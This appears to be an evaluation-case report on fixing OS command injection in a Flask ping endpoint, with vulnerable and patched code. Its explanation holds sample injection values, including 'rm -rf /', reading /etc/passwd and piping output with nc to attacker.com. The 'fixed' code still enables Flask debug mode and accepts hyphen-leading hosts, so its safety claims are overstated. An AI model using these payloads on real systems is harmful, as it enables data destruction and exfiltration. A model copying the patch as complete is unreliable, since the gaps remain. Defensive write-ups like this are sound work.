## Verdict

VULNERABLE → FIXED

The original code uses `os.system()` with string formatting to execute a shell command with unsanitized user input, allowing OS command injection. The fixed code replaces shell execution with `subprocess.run()` using an argument list with `shell=False`, adds input validation, and includes error handling.

## Source

**File**: evals/cases/78/python/OsSystemStringFormat/OsSystemStringFormat.py  
**Line**: 21  
**Vulnerable Code**:
```python
os.system("ping -c 4 %s > %s 2>&1" % (target_host, log_path))
```

**Attack Vector**: An attacker can inject shell metacharacters in the `target_host` parameter (e.g., `127.0.0.1; rm -rf /`) to execute arbitrary OS commands.

## Fix

### File: OsSystemStringFormat.py

```python
"""Network diagnostics endpoint for the internal admin dashboard."""

import os
import re
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route("/admin/diagnostics/ping", methods=["POST"])
def run_ping_diagnostic():
    """Run a connectivity check against a host supplied by the admin UI and
    return the captured output so support staff can see the raw result."""
    payload = request.get_json(silent=True) or {}
    target_host = payload.get("host", "").strip()

    if not target_host:
        return jsonify({"error": "host is required"}), 400
    
    # Validate hostname/IP address format to prevent injection
    # Allow alphanumerics, dots, hyphens, and colons (for IPv6)
    if not re.fullmatch(r'[a-zA-Z0-9.\-:]+', target_host):
        return jsonify({"error": "invalid host format"}), 400

    log_path = "/var/log/diagnostics/ping_last.log"
    
    try:
        # Use subprocess with argument list and shell=False to prevent command injection
        result = subprocess.run(
            ["ping", "-c", "4", target_host],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        # Write output to log file
        with open(log_path, "w") as log_file:
            log_file.write(result.stdout)
            log_file.write(result.stderr)
        
        with open(log_path, "r") as log_file:
            output = log_file.read()
    except subprocess.TimeoutExpired:
        return jsonify({"error": "ping command timed out"}), 500
    except OSError as e:
        return jsonify({"error": f"failed to run ping: {str(e)}"}), 500

    return jsonify({"host": target_host, "output": output})


if __name__ == "__main__":
    app.run(debug=True)
```

## Explanation

**The Problem**: The original code uses `os.system()` with Python string formatting (`%s`) to build a shell command string. Because `target_host` comes from untrusted user input without validation, an attacker can inject shell metacharacters. For example:
- Input: `127.0.0.1; cat /etc/passwd` → executes both `ping` and `cat`
- Input: `127.0.0.1 | nc attacker.com 4444` → pipes output to attacker's server

**The Fix**:

1. **Replace `os.system()` with `subprocess.run()`**: Uses an argument list `["ping", "-c", "4", target_host]` with `shell=False` (the default). This prevents shell parsing entirely—the arguments are passed directly to the ping executable without shell interpretation of metacharacters.

2. **Add input validation**: Uses `re.fullmatch()` to ensure the hostname contains only safe characters (alphanumerics, dots, hyphens, colons). This rejects injection attempts while accepting legitimate hostnames and IPv6 addresses. It matches against the full string (not partial matches) to prevent trailing newlines or embedded shell commands.

3. **Capture output safely**: Uses `capture_output=True` to collect stdout and stderr into separate attributes, then writes them to the log file. This eliminates the need for shell redirection (`> %s 2>&1`), which was the concatenation point.

4. **Add timeout and error handling**: Prevents resource exhaustion attacks (e.g., `ping -f` flood) and handles OSError from permission/file issues gracefully.

**Why this is safe**: With `shell=False` and an argument list, the operating system's `execve()` syscall is invoked directly—no shell parser is involved, so metacharacters like `;`, `|`, `&`, `$(...)`, and backticks have no special meaning. Each array element is treated as a literal argument.

## Behaviour changes

- **Security**: Command injection is eliminated. Special shell characters in the hostname are now rejected as invalid format rather than executed.
- **Output**: The captured output is identical to the original (both stdout and stderr written to the log file), preserving the endpoint's behavior.
- **Error handling**: The endpoint now returns explicit error messages for invalid input (400), execution timeouts (500), and OS errors (500), instead of silently failing or outputting an error to the log.
- **Timeout protection**: A 10-second timeout prevents indefinite hangs from unresponsive hosts.
- **Validation**: Hostnames that don't match `[a-zA-Z0-9.\-:]+` are rejected with a 400 error. This accepts standard DNS hostnames, IPv4 addresses, and IPv6 addresses, while rejecting shell metacharacters and other suspicious input.
